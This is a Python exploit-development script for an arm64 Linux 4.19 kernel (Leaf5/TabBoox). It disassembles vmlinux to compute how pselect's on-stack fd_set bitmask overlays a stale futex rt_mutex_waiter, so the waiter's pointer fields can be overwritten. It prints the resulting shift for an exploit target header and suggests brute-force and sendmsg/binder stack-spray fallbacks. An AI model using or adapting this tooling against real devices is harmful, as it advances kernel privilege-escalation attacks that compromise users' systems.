#!/usr/bin/env python3
"""
精确计算 PSELECT_WAITER_WORD_SHIFT — Leaf5 4.19 内核

基于 vmlinux.elf capstone 反汇编分析:
  1. futex_wait 中 rt_mutex_waiter 的 SP-相对偏移
  2. core_sys_select 中 stack_fds (fd_set bitmask) 的 SP-相对偏移
  3. 调用链帧深度 → 绝对栈偏移差 → PSELECT_WAITER_WORD_SHIFT

用法:
    uv run python -m scripts.compute_pselect_shift
    uv run python -m scripts.compute_pselect_shift -v
"""

from __future__ import annotations

import argparse
import struct
from pathlib import Path
from typing import Optional

from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
from capstone.arm64 import ARM64_OP_MEM
from elftools.elf.elffile import ELFFile

ROOT = next(
    p for p in Path(__file__).resolve().parents
    if (p / "raw").is_dir() and (p / "stages").is_dir()
)
RAW = ROOT / "raw"
VMLINUX_ELF = RAW / "vmlinux.elf"

# ── 4.19 struct layouts ─────────────────────────────────────────────

# struct futex_q (4.19, arm64):
#   +0x00: plist_node list          (32B)
#   +0x20: task_struct *task        (8B)
#   +0x28: spinlock_t *lock_ptr     (8B)
#   +0x30: union futex_key key      (16B)
#   +0x40: futex_pi_state *pi_state (8B)
#   +0x48: rt_mutex_waiter waiter   (64B)  ← 4.19: no prio/deadline/ww_ctx
#   +0x88: futex_key *requeue_pi_key (8B)
FUTEX_Q_WAITER_OFF = 0x48
WAITER_SIZEOF = 0x40

# struct rt_mutex_waiter (4.19):
#   +0x00: tree_entry.__rb_parent_color  (8B)
#   +0x08: tree_entry.rb_right           (8B)
#   +0x10: tree_entry.rb_left            (8B)
#   +0x18: pi_tree_entry.__rb_parent_color (8B)
#   +0x20: pi_tree_entry.rb_right        (8B)
#   +0x28: pi_tree_entry.rb_left         (8B)
#   +0x30: task                          (8B)
#   +0x38: lock                          (8B)
#   —— 4.19 waiter ends here (0x40) ——

WAITER_FIELDS = [
    (0x00, 0, "tree_entry.__rb_parent_color"),
    (0x08, 1, "tree_entry.rb_right"),
    (0x10, 2, "tree_entry.rb_left"),
    (0x18, 3, "pi_tree_entry.__rb_parent_color"),
    (0x20, 4, "pi_tree_entry.rb_right"),
    (0x28, 5, "pi_tree_entry.rb_left"),
    (0x30, 6, "task"),
    (0x38, 7, "lock"),
]

# ── Helpers ─────────────────────────────────────────────────────────

ADDR_MASK = 0xFFFFFFFFFFFFFFFF


def load_vmlinux(path: Path) -> tuple[dict, int, bytes]:
    with open(path, "rb") as f:
        elf = ELFFile(f)
        symtab = elf.get_section_by_name(".symtab")
        if not symtab:
            raise ValueError("No .symtab in ELF")
        symbols = {
            sym.name: sym.entry.st_value
            for sym in symtab.iter_symbols()
            if sym.name
        }
        for sec in elf.iter_sections():
            if sec.name == ".kernel" and sec.header.sh_type == "SHT_PROGBITS":
                return symbols, sec.header.sh_addr, sec.data()
    raise ValueError("No .kernel PROGBITS section found")


def parse_imm(s: str) -> int:
    s = s.strip().rstrip("]!,")
    if s.startswith("0x") or s.startswith("0X"):
        return int(s, 16)
    if s.startswith("#"):
        s = s[1:]
    if s.startswith("0x") or s.startswith("0X"):
        return int(s, 16)
    if s.startswith("-"):
        rest = s[1:]
        return -int(rest, 16 if rest.startswith("0x") else 10)
    if "," in s:
        s = s.split(",")[0]
    return int(s, 16 if s.startswith("0x") else 10)


def bl_target(insn) -> int:
    """Return the actual uint64 target of a BL instruction.
    Capstone returns int64 which can be negative for kernel addresses."""
    return insn.operands[0].imm & ADDR_MASK


# ── Core Analysis ───────────────────────────────────────────────────


def find_frame_size(symbols, text_base, text_data, name: str) -> tuple[int, int]:
    """Return (total_frame_alloc, fp_offset_from_sp)."""
    addr = symbols[name]
    off = addr - text_base
    fbytes = text_data[off : off + 0x400]

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    total = 0
    fp_off = 0
    for insn in md.disasm(fbytes, addr):
        op = insn.op_str
        if insn.mnemonic == "sub" and "sp, sp" in op:
            total += parse_imm(op.split("#")[-1].strip(","))
        elif insn.mnemonic == "stp" and "[sp, #-" in op and "]!" in op:
            total += parse_imm(op.split("#-")[1].split("]")[0])
        elif insn.mnemonic == "add" and "x29, sp" in op:
            fp_off = parse_imm(op.split("#")[-1])
        if insn.mnemonic == "ret" and total > 0:
            break
    return total, fp_off


def find_sp_accesses(
    symbols, text_base, text_data, name: str
) -> tuple[int, list[tuple[int, str, str]]]:
    """Return (fp_offset, [(sp_offset, mnemonic, op_str), ...]) for SP/X29-relative accesses."""
    addr = symbols[name]
    off = addr - text_base
    fbytes = text_data[off : off + 0x600]

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    fp_off = 0
    accesses = []

    for insn in md.disasm(fbytes, addr):
        # First, detect fp offset
        if fp_off == 0 and insn.mnemonic == "add" and "x29, sp" in insn.op_str:
            fp_off = parse_imm(insn.op_str.split("#")[-1])

        if insn.mnemonic == "ret":
            break

        for operand in insn.operands:
            if operand.type == ARM64_OP_MEM and operand.mem.base != 0:
                base_reg = insn.reg_name(operand.mem.base)
                disp = operand.mem.disp
                if base_reg in ("sp", "x29") and 0 <= disp <= 0x2000:
                    sp_off = disp
                    if base_reg == "x29":
                        sp_off = fp_off + disp
                    accesses.append((sp_off, insn.mnemonic, insn.op_str))

    return fp_off, accesses


def find_all_bl_calls(
    symbols, text_base, text_data, name: str
) -> list[tuple[int, int, str]]:
    """Return [(call_addr, target_addr, target_name), ...] for all BL calls."""
    addr = symbols[name]
    off = addr - text_base
    fbytes = text_data[off : off + 0x600]

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    calls = []
    for insn in md.disasm(fbytes, addr):
        if insn.mnemonic == "bl":
            target = bl_target(insn)
            # Find matching symbol
            target_name = None
            for sym_name, sym_addr in symbols.items():
                if sym_addr == target:
                    target_name = sym_name
                    break
            calls.append((insn.address, target, target_name or f"0x{target:x}"))
        if insn.mnemonic == "ret":
            break
    return calls


def trace_arg_setup(
    symbols, text_base, text_data, func_name: str,
    target_func: str, target_addr: int, arg_regs: list[str],
) -> dict[str, int]:
    """Look backward from a BL instruction to find SP-relative addresses
    loaded into argument registers. Returns {reg: sp_offset}."""
    addr = symbols[func_name]
    off = addr - text_base
    fbytes = text_data[off : off + 0x600]

    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    # Find the BL instruction index and fp_offset
    insns = list(md.disasm(fbytes, addr))
    fp_off = 0
    bl_idx = None

    for i, insn in enumerate(insns):
        if fp_off == 0 and insn.mnemonic == "add" and "x29, sp" in insn.op_str:
            fp_off = parse_imm(insn.op_str.split("#")[-1])
        if insn.mnemonic == "bl" and bl_target(insn) == target_addr:
            bl_idx = i
        if insn.mnemonic == "ret":
            break

    if bl_idx is None or fp_off == 0:
        return {}

    # Look backward from BL for register setup
    result = {}
    for i in range(max(0, bl_idx - 30), bl_idx):
        insn = insns[i]
        op = insn.op_str.replace(" ", "")
        if insn.mnemonic == "add":
            parts = op.split(",")
            if len(parts) >= 3 and parts[0] in arg_regs and parts[1] == "sp":
                result[parts[0]] = parse_imm(parts[2])
        elif insn.mnemonic == "sub":
            parts = op.split(",")
            if len(parts) >= 3 and parts[0] in arg_regs and parts[1] == "x29":
                result[parts[0]] = fp_off - parse_imm(parts[2])

    return result


def compute_shift(symbols, text_base, text_data, verbose: bool = False) -> dict:
    """Main computation."""

    vprint = print if verbose else lambda *a, **k: None

    # ── Step 1: Find futex_q in futex_wait ──────────────────────────
    vprint("=" * 72)
    vprint("Step 1: Locate futex_q / waiter in futex_wait")
    vprint("=" * 72)

    futex_wait_setup_addr = symbols["futex_wait_setup"]
    vprint(f"  futex_wait_setup @ 0x{futex_wait_setup_addr:x}")

    # Trace arguments to futex_wait_setup(futex_wait):
    #   futex_wait_setup(uaddr, val, flags, &q, &hb)
    #   x3 = &futex_q, x4 = &hb
    futex_args = trace_arg_setup(
        symbols, text_base, text_data,
        "futex_wait", "futex_wait_setup",
        futex_wait_setup_addr, ["x3", "x4"],
    )

    futex_q_sp = None
    if "x3" in futex_args:
        futex_q_sp = futex_args["x3"]
        vprint(f"  futex_q @ SP+0x{futex_q_sp:x} "
               f"(x3 arg to futex_wait_setup = add x3, sp, #{futex_q_sp})")
    else:
        # Fallback: look for "add x3, sp, #N" near the futex_wait_setup BL
        vprint("  [WARN] Could not trace x3, trying pattern match...")
        addr = symbols["futex_wait"]
        off = addr - text_base
        fbytes = text_data[off : off + 0x600]
        md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
        md.detail = True
        insns = list(md.disasm(fbytes, addr))
        for i, insn in enumerate(insns):
            if insn.mnemonic == "bl" and bl_target(insn) == futex_wait_setup_addr:
                # Look backward for add x3, sp, #N
                for j in range(i - 1, max(0, i - 15), -1):
                    prev = insns[j]
                    if (prev.mnemonic == "add" and
                        "x3, sp" in prev.op_str):
                        futex_q_sp = parse_imm(
                            prev.op_str.split("#")[-1].rstrip("]"))
                        vprint(f"  futex_q @ SP+0x{futex_q_sp:x} "
                               f"(from add x3, sp, #{futex_q_sp})")
                        break
                break

    if futex_q_sp is None:
        raise RuntimeError("Cannot determine futex_q stack offset")

    waiter_sp = futex_q_sp + FUTEX_Q_WAITER_OFF
    vprint(f"  waiter  @ SP+0x{waiter_sp:03x} (futex_q+0x{FUTEX_Q_WAITER_OFF:x})")
    vprint(f"  waiter sizeof = 0x{WAITER_SIZEOF:x} ({WAITER_SIZEOF}B)")
    vprint()

    # ── Step 2: Find stack_fds in core_sys_select ───────────────────
    vprint("=" * 72)
    vprint("Step 2: Locate stack_fds in core_sys_select")
    vprint("=" * 72)

    # The stack_fds is set via "add x19, sp, #0x50" (stack allocation path)
    addr = symbols["core_sys_select"]
    off = addr - text_base
    fbytes = text_data[off : off + 0x600]
    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
    md.detail = True

    stack_fds_sp = None
    fdset_bits_sp = None

    for insn in md.disasm(fbytes, addr):
        if insn.mnemonic == "add" and "x19, sp" in insn.op_str:
            stack_fds_sp = parse_imm(insn.op_str.split("#")[-1].rstrip("]"))
            break
        if insn.mnemonic == "ret":
            break

    if stack_fds_sp is None:
        raise RuntimeError("Cannot determine stack_fds offset")

    vprint(f"  stack_fds @ SP+0x{stack_fds_sp:03x} (= fd_set bitmask base)")
    vprint()

    # ── Step 3: Call chain depths ───────────────────────────────────
    vprint("=" * 72)
    vprint("Step 3: Call chain stack depth analysis")
    vprint("=" * 72)

    frames = {}
    for func in [
        "__arm64_sys_futex", "do_futex", "futex_wait",
        "__arm64_sys_pselect6", "core_sys_select",
    ]:
        size, fp_off = find_frame_size(symbols, text_base, text_data, func)
        frames[func] = size

    futex_path = [
        ("__arm64_sys_futex", frames["__arm64_sys_futex"]),
        ("do_futex", frames["do_futex"]),
        ("futex_wait", frames["futex_wait"]),
    ]
    futex_total = sum(f[1] for f in futex_path)

    pselect_path = [
        ("__arm64_sys_pselect6", frames["__arm64_sys_pselect6"]),
        ("core_sys_select", frames["core_sys_select"]),
    ]
    pselect_total = sum(f[1] for f in pselect_path)

    for label, path in [("Futex", futex_path), ("Pselect", pselect_path)]:
        vprint(f"  {label} call chain:")
        for name, size in path:
            vprint(f"    {name:<30s} 0x{size:04x} ({size}B)")
        total = sum(f[1] for f in path)
        vprint(f"    {'TOTAL':<30s} 0x{total:04x} ({total}B)")
        vprint()

    # ── Step 4: Compute SHIFT ───────────────────────────────────────
    vprint("=" * 72)
    vprint("Step 4: Compute PSELECT_WAITER_WORD_SHIFT")
    vprint("=" * 72)

    # Both paths start from same kernel_stack_top (exception entry cancels).
    # After futex_wait returns, stale waiter data persists on stack.
    # When pselect later runs, its fd_set is at a different stack position.
    #
    # Stale waiter absolute offset from kernel_stack_top:
    #   -(sys_futex + do_futex) + waiter_sp_in_futex_wait
    #   BUT: waiter is in futex_wait's frame, which is at deeper SP.
    #   waiter_abs = -(futex_total) + waiter_sp
    #
    # Fd_set absolute offset:
    #   fdset_abs = -(pselect_total) + fdset_sp
    #
    # Note: exception entry frame is identical for both calls → cancels out.

    waiter_abs = -futex_total + waiter_sp
    fdset_abs = -pselect_total + stack_fds_sp

    delta_bytes = waiter_abs - fdset_abs
    shift = delta_bytes // 8

    vprint(f"  Futex depth to futex_wait SP:     0x{futex_total:04x}")
    vprint(f"  Pselect depth to core_sys_select SP: 0x{pselect_total:04x}")
    vprint(f"  Waiter SP-relative offset:  0x{waiter_sp:03x}")
    vprint(f"  Fd_set SP-relative offset:  0x{stack_fds_sp:03x}")
    vprint(f"  Waiter abs stack offset:    {waiter_abs:+d}")
    vprint(f"  Fd_set abs stack offset:    {fdset_abs:+d}")
    vprint(f"  Δ bytes (waiter - fd_set):  {delta_bytes:+d}")
    vprint(f"  Δ words = PSELECT_WAITER_WORD_SHIFT = {shift}")
    vprint()

    # ── Step 5: Generate mapping ────────────────────────────────────
    vprint("=" * 72)
    vprint("Step 5: fd_set word → waiter field mapping")
    vprint("=" * 72)

    words_per_set = (640 + 63) // 64  # based on PSELECT_ROUTE_NFDS=640
    max_global = 3 * words_per_set - 1

    mapping = []
    for byte_off, word_off, name in WAITER_FIELDS:
        global_word = word_off + shift
        set_idx = global_word // words_per_set
        word_idx = global_word % words_per_set

        if 0 <= set_idx < 3:
            fd_set_name = ["in", "out", "ex"][set_idx]
            reachable = "✓"
        else:
            fd_set_name = f"set[{set_idx}]"
            reachable = "✗ OUT OF RANGE"

        mapping.append({
            "byte_off": byte_off,
            "waiter_word": word_off,
            "global_word": global_word,
            "set_name": fd_set_name,
            "word_idx": word_idx,
            "field": name,
            "reachable": reachable,
        })

    vprint(f"  PSELECT_WAITER_WORD_SHIFT = {shift}")
    vprint(f"  Words per fd_set = {words_per_set} "
           f"(PSELECT_ROUTE_NFDS=640)")
    vprint(f"  Global word range: [0..{max_global}]")
    vprint()
    header = (f"  {'Byte':>5s} {'WtrWd':>5s} {'GlbWd':>5s} "
              f"{'Set':>6s} {'Idx':>4s}  Field")
    vprint(header)
    vprint(f"  {'-'*5} {'-'*5} {'-'*5} {'-'*6} {'-'*4}  {'-'*35}")
    for m in mapping:
        vprint(f"  0x{m['byte_off']:03x} {m['waiter_word']:5d} "
               f"{m['global_word']:5d} {m['set_name']:>6s} "
               f"{m['word_idx']:4d}  {m['reachable']} {m['field']}")

    overflow = [m for m in mapping if m["reachable"].startswith("✗")]
    if overflow:
        vprint(f"\n  ⚠  {len(overflow)} fields out of range!")

    return {
        "shift": shift,
        "waiter_sp": waiter_sp,
        "fdset_sp": stack_fds_sp,
        "futex_depth": futex_total,
        "pselect_depth": pselect_total,
        "delta_bytes": delta_bytes,
        "waiter_abs": waiter_abs,
        "fdset_abs": fdset_abs,
        "mapping": mapping,
        "words_per_set": words_per_set,
        "max_global": max_global,
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Compute PSELECT_WAITER_WORD_SHIFT from vmlinux.elf"
    )
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--elf", type=Path, default=VMLINUX_ELF)
    parser.add_argument("--nfds", type=int, default=640)
    args = parser.parse_args()

    if not args.elf.exists():
        print(f"ERROR: {args.elf} not found.")
        return 1

    symbols, text_base, text_data = load_vmlinux(args.elf)

    required = [
        "futex_wait", "futex_wait_setup",
        "core_sys_select", "do_select",
        "__arm64_sys_futex", "__arm64_sys_pselect6",
        "do_futex",
    ]
    missing = [s for s in required if s not in symbols]
    if missing:
        print(f"ERROR: Missing symbols: {missing}")
        return 1

    result = compute_shift(symbols, text_base, text_data, verbose=args.verbose)

    # ── Summary ─────────────────────────────────────────────────────
    print()
    print("=" * 60)
    print("PSELECT_WAITER_WORD_SHIFT 计算结果")
    print("=" * 60)
    print(f"  内核:          4.19.157 (Leaf5 / TabBoox)")
    print(f"  Waiter SP偏移:  0x{result['waiter_sp']:x}")
    print(f"  Fd_set SP偏移:  0x{result['fdset_sp']:x}")
    print(f"  Futex 调用深度:  0x{result['futex_depth']:x} "
          f"({result['futex_depth']}B)")
    print(f"  Pselect 调用深度: 0x{result['pselect_depth']:x} "
          f"({result['pselect_depth']}B)")
    print(f"  Δ 字节:         {result['delta_bytes']:+d}")
    print(f"  Δ 词 (8字节):   {result['shift']:+d}")
    print()
    print(f"  >>> PSELECT_WAITER_WORD_SHIFT = {result['shift']} <<<")
    print()

    # Check reachability
    shift = result["shift"]
    words_per_set = result["words_per_set"]
    max_global = result["max_global"]

    needed = [shift + w for w in range(8)]  # words 0-7 of waiter
    in_range = [w for w in needed if 0 <= w <= max_global]

    if len(in_range) < len(needed):
        print(f"  ⚠ 警告: SHIFT={shift} 将 waiter 放在 global_words "
              f"[{min(needed)}..{max(needed)}],")
        print(f"     但 fd_sets 仅支持 [0..{max_global}] "
              f"(PSELECT_ROUTE_NFDS={args.nfds})")
        print(f"     仅 {len(in_range)}/{len(needed)} 字段可访问。")
        print()
        print(f"  建议:")
        abs_needed = abs(min(needed)) if min(needed) < 0 else max(0, max(needed) - max_global)
        suggested_nfds = max(640, (max(abs(min(needed)), max(needed)) + 8) * 64)
        print(f"    1. 调整 PSELECT_ROUTE_NFDS → {suggested_nfds} "
              f"(使所有字段在范围内)")
        print(f"    2. 运行时二分搜索 PSELECT_SHIFT_OVERRIDE")
        print(f"    3. 考虑 sendmsg/binder 栈覆盖后备方案")
    else:
        print(f"  ✓ Waiter 字段在 global_words [{min(needed)}..{max(needed)}],")
        print(f"    fd_set 范围 [0..{max_global}] — 可覆盖")

    print()
    print(f"  应用: 更新 exploit/targets/onyx-leaf5/target.h:")
    print(f"    #define PSELECT_WAITER_WORD_SHIFT {shift}")
    print()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
